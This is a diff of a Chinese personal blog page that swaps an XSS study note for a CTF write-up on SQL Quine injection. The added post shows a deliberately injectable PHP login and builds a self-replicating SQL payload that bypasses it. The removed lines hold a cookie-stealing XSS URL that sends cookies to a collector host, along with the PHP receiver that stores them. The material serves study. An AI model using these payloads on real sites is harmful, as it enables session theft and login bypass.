@@ -3,7 +3,7 @@
 <html lang="zh_CN">
 <head>
     <meta charset="utf-8" />
-    <title>XSS跨站脚本攻击 | Tremseの部屋</title>
+    <title>Quine注入 | Tremseの部屋</title>
     <meta name="author" content="Tremse" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -156,14 +156,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>XSS跨站脚本攻击</h1>
+        <h1>Quine注入</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/11/7
+            2024/11/26
         </span>
         
         <span class="category">
@@ -184,15 +184,15 @@
             
             <span class="tag">
                 
-                <a href="/tags/Web/" style="color: #03a9f4">
+                <a href="/tags/Web/" style="color: #00bcd4">
                     Web
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/PHP/" style="color: #ffa2c4">
-                    PHP
+                <a href="/tags/SQL/" style="color: #ffa2c4">
+                    SQL
                 </a>
             </span>
             
@@ -201,30 +201,76 @@
     </div>
     
     <div class="content" v-pre>
-        <blockquote>
-<p>这是我的笔记！不太好参考噢~</p>
-</blockquote>
-<p>&emsp;&emsp;XSS即跨站脚本攻击(Cross Site Scripting),本来应该缩写成css，但毕竟三大件有了，就叫xss了。<font color="#ff9f9f"><strong>只有动态网站才有会被xss的可能</strong></font>，因为xss原理就是在网页中注入而已js语句，在用户访问时执行它们来达到目的，静态网站由于没有注入点(毕竟不需要交互，没有输入)是不会被攻击的。<br>&emsp;&emsp;比如某个页面后端用php编写，有以下源码:</p>
+        <h3 id="什么是quine注入"><a href="#什么是quine注入" class="headerlink" title="什么是quine注入?"></a>什么是quine注入?</h3><p>&emsp;&emsp;quine是一种计算机程序，它不接受输入并产生自己源代码的副本作为唯一的输出.<br>&emsp;&emsp;在ctf应用中，Quine注入的目的就是使得输入输出一致，绕过限制登录。这样说大概还是不够具体，让我们看一道例题吧。</p>
+<h4 id="第五空间-2021yet_another_mysql_injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h4><p>&emsp;&emsp;以下是源码:</p>
 <pre><code class="PHP">&lt;?php
-$xss = $_GET[&#39;x&#39;];
-echo $xss;
-?&gt;
+  include_once(&quot;lib.php&quot;);
+function alertMes($mes,$url)&#123;
+  die(&quot;&lt;script&gt;alert(&#39;&#123;$mes&#125;&#39;);location.href=&#39;&#123;$url&#125;&#39;;&lt;/script&gt;&quot;);
+&#125;
+
+function checkSql($s) &#123;
+  if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;,$s))&#123;
+    alertMes(&#39;hacker&#39;, &#39;index.php&#39;);
+  &#125;
+&#125;
+
+if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] != &#39;&#39; &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;password&#39;] != &#39;&#39;) &#123;
+  $username=$_POST[&#39;username&#39;];
+  $password=$_POST[&#39;password&#39;];
+  if ($username !== &#39;admin&#39;) &#123;
+    alertMes(&#39;only admin can login&#39;, &#39;index.php&#39;);
+  &#125;
+  checkSql($password);
+  $sql=&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;$password&#39;;&quot;;
+  $user_result=mysqli_query($con,$sql);
+  $row = mysqli_fetch_array($user_result);
+  if (!$row) &#123;
+    alertMes(&quot;something wrong&quot;,&#39;index.php&#39;);
+  &#125;
+  if ($row[&#39;password&#39;] === $password) &#123;
+    die($FLAG);
+  &#125; else &#123;
+    alertMes(&quot;wrong password&quot;,&#39;index.php&#39;);
+  &#125;
+&#125;
+
+if(isset($_GET[&#39;source&#39;]))&#123;
+  show_source(__FILE__);
+  die;
+&#125;
+  ?&gt;
+  &lt;!-- /?source --&gt;
+  &lt;html&gt;
+    &lt;body&gt;
+      &lt;form action=&quot;/index.php&quot; method=&quot;post&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;账号&quot;&gt;&lt;br/&gt;
+        &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;br/&gt;
+        &lt;input type=&quot;submit&quot; / value=&quot;登录&quot;&gt;
+      &lt;/form&gt;
+    &lt;/body&gt;
+  &lt;/html&gt;
 </code></pre>
-<p>&emsp;&emsp;那么很明显，我们可以通过控制x这个用户输入变量来干一些事情，插入一段js代码不在话下，这就是最简单的xss攻击了。</p>
-<h3 id="xss攻击的类型"><a href="#XSS攻击的类型" class="headerlink" title="XSS攻击的类型"></a>XSS攻击的类型</h3><h4 id="emsp1反射型非持久化xss"><a href="#emsp-1-反射型·非持久化XSS" class="headerlink" title="&emsp;1.反射型·非持久化XSS"></a>&emsp;<font color="#5f5f5f">1.反射型·非持久化XSS</font></h4><p>&emsp;&emsp;一次性的XSS攻击，将XSS代码通过url中参数的形式发送至服务器，让其解析并返回含有XSS的结果给浏览器，使之执行XSS代码，达到攻击目的。<br>&emsp;&emsp;通过某些手段(比如rz学长非常喜欢玩的QR-code)让用户访问存在XSS的url，使得XSS攻击成功。一个应用就是拿取用户在本站的cookie。<br>&emsp;&emsp;以DVWA靶场的反射型XSS为例，如果我们如此构造一个url(注意靶场url，我是用docker部署的，8087端口映射到80)(注意script标签是不准确的，因为标准的会被识别为html标签所以这样绕过):</p>
-<pre><code class="URL">http://localhost:8087/vulnerabilities/xss_r/?name=&lt;&quot;scripts&gt;document.location=&#39;http://192.168.43.15/cookiein.php?cookie=&#39;+document.cookie;&lt;&quot;/scripts&gt;
+<p>&emsp;&emsp;关键在于<span style="font-family:'Cascadia Code';color:#6faf9f">if ($row[‘password’] &#x3D;&#x3D;&#x3D; $password) </span>,也就是说，我们查询出来的结果要和我们输入的密码强一致才能登录成功。也就是要用到quine这个“自己生自己”的技巧了。在做这题之前，我们要先搞清楚sql_quine注入的构造过程。</p>
+<h4 id="构造quine"><a href="#构造quine" class="headerlink" title="构造quine"></a>构造quine</h4><p>&emsp;&emsp;最基础的基本语句:<span style="font-family:'Cascadia Code';color:#6faf9f">select replace(“.”,char(46),”.”);</span>,作用就是把”.”中的.换成.(非常像废话，但这就是核心思路了)<br>&emsp;&emsp;接下来看这个语句:</p>
+<pre><code class="SQL">select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); #查询语句
+replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;); #输出语句
 </code></pre>
-<p>&emsp;&emsp;并且在我们的服务器上有这么一个页面(部署在”192.168.43.15&#x2F;cookiein.php”):</p>
-<pre><code class="PHP">&lt;?php
-$cookie=$_GET[&#39;cookie&#39;];
-file_put_contents(&#39;cookie.txt&#39;,$cookie);
-?&gt;
+<p>&emsp;&emsp;真神奇啊，查询语句和输出基本是完全一致的。但有问题，那就是引号仍然存在不同，原本的单引号成为了双引号(本来字符串中包含.的是双引号，所以会出现这样的情况)，然而我们不能把原来的单引号改成双引号来避免，<font color="#ff9f9f"><strong>因为replace(“.”,char(46),”.”)字符串中有双引号，所以把它当作字符串写入replace时要用单引号，不然会报错</strong></font>。<br>&emsp;&emsp;所以要想办法把’变成”，同时又要保持输入输出相等，那么再用一次replace不久好了?于是就构造出了以下的语句:</p>
+<pre><code class="SQL">replace(&quot;.&quot;,char(34),char(39)) #首先是最好想的，把&quot;变成&#39;，输出的是 .
+replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;) #实现自我替换，输出的仍然是 .
+replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)); #将之前的语句作为字符串，改变其中的引号，成功达成了将引号变换
+replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)
 </code></pre>
-<p>&emsp;&emsp;那么只要某个用户通过这个url进入靶场，那么就可以得到他的cookie并且存储到cookie.txt中。</p>
-<h4 id="emsp2存储型持久化xss"><a href="#emsp-2-存储型·持久化XSS" class="headerlink" title="&emsp;2.存储型·持久化XSS"></a>&emsp;<font color="#5f5f5f">2.存储型·持久化XSS</font></h4><p>&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于，<font color="#ff9f9f"><strong>提交的代码会存储在服务器端</strong></font>（数据库、内存、文件系统等），下次有用户请求目标页面时XSS会再次运行(已经成为了页面的一部分了)，从而攻击成功。这样甚至不用诱导目标访问某个url就能达到目的。<br>&emsp;&emsp;也就是说，只要进行一次XSS攻击，XSS恶意代码就会被保留在页面中，只要有用户访问该页面，就会触发。其它的和反射型XSS是一致的。</p>
-<h4 id="emsp3dom型xss"><a href="#emsp-3-DOM型XSS" class="headerlink" title="&emsp;3.DOM型XSS"></a>&emsp;<font color="#5f5f5f">3.DOM型XSS</font></h4><p>&emsp;&emsp;利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数<font color="#ff9f9f"><strong>不用发送到服务器端</strong></font>，可以达到绕过WAF、躲避服务端检测的效果。</p>
+<p>&emsp;&emsp;实现了引号的替换,就再套一次之前的quine语句就好哩</p>
+<pre><code class="SQL">replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
+</code></pre>
+<p>&emsp;&emsp;这就是sql quine的语句了,真的很神奇呢。</p>
+<h4 id="回到例题"><a href="#回到例题" class="headerlink" title="回到例题"></a>回到例题</h4><p>&emsp;&emsp;再看例题，利用我们得出的模板，将注入语句添加到几个位置即可</p>
+<pre><code class="SQL">/*这是第一个位置，因为查询语句不可能只是replace这样，需要select等。如联合注入时，就用类似于1&#39; union select */replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
+</code></pre>
 <blockquote>
-<p>详细例子见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12542695.html">这里</a>~</p>
+<p>参考:<br>    - <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2287111">SQL注入之Quine注入</a><br>    - <a target="_blank" rel="noopener" href="https://j-0k3r.github.io/2023/12/06/Quine%E6%B3%A8%E5%85%A5/#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection">Quine注入</a></p>
 </blockquote>
 
     </div>
